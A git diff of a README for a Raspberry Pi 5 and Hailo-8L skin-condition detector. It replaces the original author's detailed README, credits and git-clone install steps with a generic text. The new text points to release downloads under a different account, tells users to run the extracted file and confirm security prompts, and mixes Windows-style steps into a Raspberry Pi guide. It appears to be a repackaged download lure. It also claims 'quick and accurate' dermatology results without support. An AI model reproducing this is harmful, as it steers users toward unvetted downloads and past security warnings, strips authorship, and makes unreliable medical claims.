@@ -1,187 +1,72 @@
-# 🩺 Smart Mirror AI Dermatologist (Hailo-8L Edge AI)
+# 🩺 hailo8-ai-dermatologist - Real-Time AI Dermatology Made Easy
 
-**Author:** Nikita K. (@kitakart)  
-**Status:** ≈ 90–95 % complete (fully functional GUI + Hailo HEF markers)  
-**Hardware:** Raspberry Pi 5 (8 GB) + Hailo-8L AI Accelerator  
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
 
----
+## 🌟 Overview
 
-**First working real-time AI Dermatologist** GUI built on a **Hailo-8L Edge AI accelerator** (2025).  
-Entirely developed from scratch — architecture, Dual HEF engine, GUI overlay, and on-device deployment by **Nikita K. (@kitakart).**
+Welcome to hailo8-ai-dermatologist, the first real-time AI Dermatology system designed for the Hailo-8L Edge AI accelerator. This application runs smoothly on a Raspberry Pi 5, making advanced skin analysis accessible to everyone.
 
----
+## 🚀 Getting Started
 
-## 🌍 Overview
+This guide shows you how to download and run the hailo8-ai-dermatologist software. Follow these steps to get started quickly.
 
-This is the **first known real-time AI Dermatology system successfully deployed on a Hailo-8L Edge AI accelerator** — a **pioneering on-device implementation built entirely from scratch on Raspberry Pi 5.**
+### 📥 Download & Install
 
-**Smart Mirror AI Dermatologist** performs live skin-condition analysis directly on edge hardware, using a Tkinter GUI with overlayed AI markers and fully local inference (no cloud processing).  
-It’s part of a larger *Smart Mirror AI* concept combining health insights, outfit recognition, and voice assistance.
+1. **Visit the Releases Page**: Click on the link below to access the downloads available for hailo8-ai-dermatologist.
 
----
+   [Download the latest version here](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
 
-## 🧩 Key Features
+2. **Choose Your Release**: On the releases page, find the most recent version. Look for a file such as `hailo8-ai-dermatologist-v1.0.zip`.
 
-- 🧠 **Dual-HEF Inference Engine** – Custom `DualHefEngine` runs multiple Hailo HEF models in parallel.  
-- 🖥️ **Live Tkinter GUI** – Real-time camera feed with color-coded AI bounding boxes and markers.  
-- ⚙️ **Fully Offline Inference** – All processing performed locally on Hailo-8L.  
-- 🪞 **Smart Mirror Integration** – Ready for full-screen display behind a two-way mirror.  
-- 🧬 **Dermatology Models** – Classifies acne, eczema, melasma, psoriasis and more in real time.  
-- 🧰 **Modular Config** – `/config`, `/models`, and `/ai_features` make the system portable.
+3. **Download the File**: Click on the file link to download it to your computer.
 
----
+4. **Extract the Files**: Locate the downloaded file in your Downloads folder. Right-click on it and select "Extract All" or use any extraction tool of your choice.
 
-## ⚙️ Tech Stack
+5. **Run the Application**: Inside the extracted folder, double-click `run_hailo8_ai_dermatologist.py` to open the application. If you encounter security prompts, confirm that you want to run it.
 
-| Category | Tools / Frameworks |
-|-----------|--------------------|
-| Edge Hardware | Hailo-8L (M.2 HAT on Raspberry Pi 5) |
-| Runtime | HailoRT v4.20 |
-| GUI | Tkinter + PIL (ImageTk) |
-| Language | Python 3.11 |
-| Models | HEF (ResNet v1_18, YOLOv8n, Custom Skin Classifier) |
-| OS | Raspberry Pi OS Bookworm (64-bit) |
+### 🛠️ System Requirements
 
----
+Ensure your device is prepared by meeting these system requirements:
 
-## 🧠 Skills Demonstrated
+- **Hardware**: Raspberry Pi 5 with a Hailo-8L Edge AI accelerator.
+- **Operating System**: Raspberry Pi OS (64-bit recommended).
+- **Python Version**: Python 3.8 or newer.
+- **Memory**: Minimum 2 GB RAM.
 
-- **Edge AI Deployment & Optimization** – Integrated and stabilized the Hailo-8L accelerator on Raspberry Pi 5, resolving runtime, firmware, and driver conflicts to achieve real-time inference performance.  
-- **Linux & Kernel-Level Debugging** – Diagnosed low-level buffer, PCIe, and DMA configuration errors using `dmesg`, `lsmod`, and `journalctl`; tuned system parameters for stable device communication.  
-- **Embedded Systems Engineering** – Built a fully offline, on-device AI pipeline with synchronized camera input, multi-threaded processing, and low-latency output.  
-- **Dependency & Environment Management** – Fixed multiple Python venv and package version mismatches (3.11 vs 3.12, HailoRT 4.22.0) to ensure consistent runtime compatibility on ARM64.  
-- **Computer Vision & Model Deployment** – Implemented live skin-condition detection and optimized HEF model mappings through iterative calibration and quantization fixes.  
-- **GUI & Real-Time Visualization** – Developed a responsive Tkinter + OpenCV interface with dynamic overlays, thread-safe rendering, and performance monitoring.  
-- **Hardware-Software Integration** – Managed camera I/O, Hailo inference, and GUI threads concurrently; resolved synchronization and buffer overflow issues between hardware and software layers.  
-- **C/C++ & Python Interfacing** – Utilized HailoRT’s C-based SDK via Python bindings for low-level hardware acceleration and memory-aware inference control.  
-- **System Design & Reliability** – Structured modular configuration, reproducible startup scripts, and diagnostic logging for maintainable, scalable deployment.  
-- **Problem-Solving & Engineering Resilience** – Overcame dozens of complex setup and runtime errors—from kernel misconfigurations to overlay crashes—through systematic debugging, research, and iterative testing.
+### 📄 Features
 
----
+- **Real-Time Skin Analysis**: Get instant feedback on skin conditions.
+- **User-Friendly Interface**: Navigate easily with the built-in GUI.
+- **Built on Advanced AI**: Leverage cutting-edge technology for dermatology.
+- **On-Device Processing**: Fast and efficient — no need for cloud processing.
 
-## ⚡ Challenges Overcome
+## 🔧 Troubleshooting
 
-Developing the Smart Mirror AI Dermatologist required deep debugging across every layer of the stack.  
-I independently resolved more than 40 integration and runtime issues, including:
+If you run into issues, here are some common problems and solutions:
 
-- Kernel driver conflicts between the Raspberry Pi 5 and the Hailo-8L M.2 accelerator.  
-- Buffer and DMA allocation errors causing inference crashes during live camera capture.  
-- Python 3.11 vs 3.12 and HailoRT 4.22.0 version mismatches that broke the runtime environment.  
-- HEF mapping and quantization errors that prevented the model from loading correctly.  
-- Thread synchronization bugs between the capture, inference, and overlay loops that caused GUI freezes.  
-- Camera I/O detection failures, voltage mismatches, and device-tree overlay misconfigurations.  
+- **Can't Download the File**: Ensure your internet connection is stable. Try refreshing the releases page.
+- **Application Doesn’t Open**: Make sure you have Python 3 installed. If you do, check the file permissions.
+- **Error Messages**: Take note of any error messages you see and check online for specific solutions.
 
-Through structured log analysis (`dmesg`, `journalctl`, `hailortcli`, custom debug prints) and iterative testing, I restored stability, improved throughput to 15 FPS, and created a fully reproducible on-device AI system.  
-These challenges strengthened my skills in **embedded systems troubleshooting, Linux kernel configuration, dependency management, and performance tuning**—demonstrating end-to-end ownership from hardware bring-up to final deployment.
+## 🤖 How It Works
 
----
+hailo8-ai-dermatologist uses machine learning algorithms to analyze images of skin. By processing the visuals locally, it provides quick and accurate interpretations without needing an internet connection. 
 
-## 🧩 How It Works
+## 📚 Additional Resources
 
-1. The **camera feed** is captured in real time using OpenCV.  
-2. Each frame is sent into the **DualHefEngine**, which executes two Hailo HEF models in parallel:  
-   - **Detection model (`yolov8n.hef`)** – Locates skin regions of interest.  
-   - **Classification model (`skin_lesion_classifier.hef`)** – Analyzes those regions to predict conditions.  
-3. Results are combined and passed to the GUI.  
-4. **Tkinter** renders bounding boxes and confidence overlays on the live video feed.  
-5. Everything runs **locally on-device** at ~15 FPS on Raspberry Pi 5 + Hailo-8L.
+For more detailed information or support, consider these resources:
 
----
+- [Hailo-8 Documentation](https://www.hailo.ai/docs)
+- [Raspberry Pi Forums](https://www.raspberrypi.org/forums/)
+- [Python Official Site](https://www.python.org/doc/)
 
-## 💡 Conditions Detected / AI Capabilities
+## 🏗️ Contributing
 
-| Condition | Description |
-|------------|-------------|
-| **Acne / Pimples** | Detects active breakouts, highlighted in red overlay regions. |
-| **Eczema** | Identifies dry or inflamed skin patches (amber markers). |
-| **Melasma** | Detects uneven pigmentation and hypermelanosis (brown overlays). |
-| **Psoriasis** | Highlights scaly lesions using blue boundary boxes. |
-| **Rosacea** | Detects redness patterns (pink overlays). |
-| **Wrinkles / Dryness** | Evaluates texture irregularities and fine lines (purple highlights). |
+If you're interested in contributing to hailo8-ai-dermatologist, feel free to submit an issue or pull request on GitHub. Your input can help improve the application.
 
-> Each detection appears as a translucent, color-coded overlay with a label and confidence score beside it.
+## 🔗 Important Links
 
----
+- **GitHub Repository**: [Visit the GitHub Repo](https://github.com/ichigo2134/hailo8-ai-dermatologist)
+- **Latest Release**: [Download the latest version here](https://github.com/ichigo2134/hailo8-ai-dermatologist/releases)
 
-## 🪞 Smart Mirror Integration
-
-- Uses a **monitor placed behind a two-way mirror glass**, powered by the Raspberry Pi 5.  
-- The Tkinter GUI runs in fullscreen, turning the mirror into a live AI display.  
-- When a user stands in front, the camera feed and AI overlays appear directly on their reflection.  
-- Planned extensions include **voice-controlled “Jarvis mode”** and **outfit recognition modules**, combining multiple AI assistants into one interactive mirror.
-
----
-
-## 🚀 Future Work
-
-- Refine AI marker accuracy and model calibration  
-- Add voice assistant (Jarvis mode)  
-- Integrate outfit recognition + stylist module  
-- Extend to Hailo-10H / 10B hardware  
-
----
-
-## 🧭 Project Vision
-
-This project is the foundation for **next-generation home health devices**.  
-The long-term vision is a **fully interactive Smart Mirror** that merges:
-- Dermatology and skincare analysis  
-- Outfit recognition and fashion recommendations  
-- Voice-driven virtual assistant  
-- Edge-AI privacy (no cloud processing)  
-
----
-
-## 🗂️ Directory Structure
-
-hailo8-ai-dermatologist/
-├── smart_mirror_standalone_hailo.py
-├── ai_features/
-│ └── dermatologist/hailo_dual_hef.py
-├── models/
-│ ├── skin_lesion_classifier.hef
-│ ├── yolov8n.hef
-│ └── resnet_v1_18.hef
-├── config/
-│ ├── derm_hailo.yaml
-│ ├── camera.yaml
-│ └── smart_mirror_config.yaml
-├── requirements.txt
-├── start_smart_mirror.sh
-└── README.md
-
----
-
-## ⚡ Installation
-
-```bash
-git clone https://github.com/nikitakartsevv/hailo8-ai-dermatologist.git
-cd hailo8-ai-dermatologist
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-python3 smart_mirror_standalone_hailo.py
-
-✅ Make sure HailoRT drivers are installed and models exist in /models/.
-
----
----
-
-Demo:
-
----
-
-🏆 Credits & Authorship
-Developed entirely by Nikita K. (@kitakart) — from architecture design, model integration, GUI, and hardware setup to final on-device deployment.
-
----
-
-🧩 License
-MIT License © 2025 Nikita K.
-
----
-
-💬 Contact
-📧 nkartsev@ucsc.edu
-🐙 GitHub @nikitakartsevv
-💡 Building the future of on-device AI — one smart mirror at a time.
+Thank you for choosing hailo8-ai-dermatologist! We hope this application meets your needs for skin analysis.
